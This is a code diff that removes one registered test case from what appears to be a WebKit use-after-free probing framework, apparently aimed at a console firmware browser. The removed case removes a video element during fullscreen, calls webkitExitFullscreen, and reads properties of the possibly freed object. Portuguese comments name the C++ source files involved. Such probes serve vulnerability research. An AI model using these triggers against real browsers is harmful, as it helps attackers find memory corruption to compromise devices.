@@ -32,54 +32,6 @@ export const Factory = {
             } catch(e) {}
         };
 
-        // ══════════════════════════════════════════════════════════════
-        // 1. HTMLVideoElement UAF via remove() durante fullscreen
-        //    C++: FullscreenVideoController.cpp / MediaPlayerPrivateManx
-        //    Risco: ALTO — vetor documentado no FW 12.xx, pode persistir
-        // ══════════════════════════════════════════════════════════════
-        register({
-            id: 'VIDEO_FULLSCREEN_REMOVE',
-            category: 'Media',
-            risk: 'HIGH',
-            description: [
-                'HTMLVideoElement.remove() enquanto FullscreenVideoController mantém',
-                'ponteiro bruto para o MediaPlayerPrivate. Se o refcount chegar a zero',
-                'antes de webkitExitFullscreen(), o controlador acessa objeto freed.'
-            ].join(' '),
-
-            setup: function() {
-                this.container = document.createElement('div');
-                document.body.appendChild(this.container);
-                this.video = document.createElement('video');
-                this.video.setAttribute('playsinline', '');
-                this.video.setAttribute('preload', 'auto');
-                // Minimal MP4 — força criação do objeto MediaPlayerPrivate nativo
-                this.video.src = 'data:video/mp4;base64,AAAAFGZ0eXBtcDQyAAAAAG1wNDI=';
-                this.container.appendChild(this.video);
-            },
-
-            trigger: function() {
-                this.video.remove();             // refcount DOM → 0
-                document.webkitExitFullscreen?.(); // acessa controller com objeto freed?
-            },
-
-            probe: [
-                s => s.video.duration,
-                s => s.video.currentTime,
-                s => s.video.readyState,
-                s => s.video.networkState,
-                s => s.video.videoWidth,
-                s => s.video.videoHeight,
-                s => s.video.buffered?.length,
-                s => s.video.played?.length,
-                s => s.video.seekable?.length,
-                s => s.video.error?.code,
-            ],
-
-            cleanup: function() {
-                try { this.container.remove(); } catch(e) {}
-            }
-        });
 
         // ══════════════════════════════════════════════════════════════
         // 2. AudioContext.close() → AudioNodes órfãos acessam C++ freed
